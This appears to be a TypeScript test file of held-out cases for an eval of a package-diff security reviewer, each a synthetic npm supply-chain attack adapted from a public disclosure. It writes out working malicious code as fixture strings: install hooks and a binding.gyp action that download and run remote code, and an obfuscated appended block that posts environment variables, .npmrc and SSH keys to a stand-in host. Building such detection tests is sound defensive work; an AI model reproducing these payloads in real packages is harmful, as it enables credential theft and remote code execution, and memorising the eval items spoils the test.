// Attacks disclosed after the reviewer's training cutoff (models.json). Each is a synthetic reduction of a public
// write-up: the trigger shape is kept, every body is written for this eval and hosts use the reserved .example domain.
// Never use these to tune prompts.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

export interface HeldOutCase extends Case { disclosed: string; source: string }

const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;

const IPC_BASE = `"use strict";\nconst listeners = new Map();\nfunction on(name, fn) { listeners.set(name, fn); }\nfunction emit(name, data) { const fn = listeners.get(name); if (fn) fn(data); }\nmodule.exports = { on, emit };\n`;
// An obfuscated block appended after module.exports: a string table, an index shuffle, a gate on the module path,
// a detached copy of the process marked by an environment variable, then the environment and credential files posted out.
const IPC_TAIL = `(function () {\n  const t = ["child_process", "spawn", "__marker", "process.env", ".npmrc", ".ssh", "https", "request", "sh.stage.example", "POST", "homedir", "readFileSync"];\n  const g = (i) => t[i];\n  if (process.env[g(2)]) return;\n  const cp = require(g(0));\n  const child = cp[g(1)](process.execPath, process.argv.slice(1), { detached: true, stdio: "ignore", env: Object.assign({}, process.env, { [g(2)]: "1" }) });\n  child.unref();\n  const fs = require("fs"), os = require("os"), path = require("path");\n  const home = os[g(10)]();\n  const out = { env: process.env };\n  for (const f of [g(4), g(5) + "/id_rsa"]) { try { out[f] = fs[g(11)](path.join(home, f), "utf8"); } catch (e) {} }\n  const req = require(g(6))[g(7)]({ host: g(8), method: g(9), path: "/u" });\n  req.on("error", () => {});\n  req.end(JSON.stringify(out));\n})();\n`;
const TANSTACK_INDEX = `export function createHistory() { const stack = []; return { push: (p) => stack.push(p), back: () => stack.pop() }; }\n`;
const tsHistory = (version: string, extra: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name: "route-history", version, files: files({ "package.json": pkg({ name: "route-history", version, type: "module", main: "dist/index.js", files: ["dist"], ...extra }), "dist/index.js": TANSTACK_INDEX, ...rest }) });

export const HELDOUT: HeldOutCase[] = [
  {
    id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
    source: "https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack",
    note: "patch release adds a preinstall script running a new setup.mjs that downloads and starts a second stage",
    base: [lib("kv-store", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
    head: [lib("kv-store", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
  },
  {
    id: "node-gyp-style-binding-gyp", kind: "attack", expect: "hold", disclosed: "2026-06-03",
    source: "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/",
    note: "no scripts entry: a new binding.gyp action runs a shell command at install time through node-gyp",
    base: [lib("sum-native", "1.4.0", {}, { "index.js": `module.exports = (a, b) => a + b;\n` })],
    head: [lib("sum-native", "1.4.1", {}, { "index.js": `module.exports = (a, b) => a + b;\n`, "binding.gyp": `{ "targets": [{ "target_name": "x", "actions": [{ "action_name": "prep", "inputs": [], "outputs": ["x.out"], "action": ["sh", "-c", "curl -s https://stage.example/s.sh | sh"] }] }] }\n` })],
  },
  {
    id: "jscrambler-style-preinstall-binary", kind: "attack", expect: "hold", disclosed: "2026-07-11",
    source: "https://jscrambler.com/blog/security-incident-postmortem-jscrambler/",
    note: "minor release adds a preinstall hook that downloads a native binary and runs it",
    base: [lib("code-guard", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
    head: [lib("code-guard", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
  },
  {
    id: "node-ipc-style-appended-require-payload", kind: "attack", expect: "hold", disclosed: "2026-05-14",
    source: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack",
    note: "patch release, no install script: an obfuscated block is appended to the CommonJS bundle after module.exports and runs when the package is required; the ESM entry is unchanged",
    base: [lib("ipc-bus", "12.0.0", {}, { "ipc.cjs": IPC_BASE, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
    head: [lib("ipc-bus", "12.0.1", {}, { "ipc.cjs": IPC_BASE + IPC_TAIL, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
  },
  {
    id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
    source: "https://tanstack.com/blog/npm-supply-chain-compromise-postmortem",
    note: "1.161.6 to 1.161.9 (1.161.6 is the last release before the two malicious ones): no scripts entry; the only manifest change is an optionalDependencies entry on a git commit, and a large obfuscated file sits at the package root outside the files list",
    base: [tsHistory("1.161.6", {}, {})],
    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:route-org/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": `(function(){var a=["child_process","exec","env","https://stage.example/u"];require(a[0])[a[1]]("node -e \\"require('https').get('"+a[3]+"')\\"");})();\n` })],
  },
];
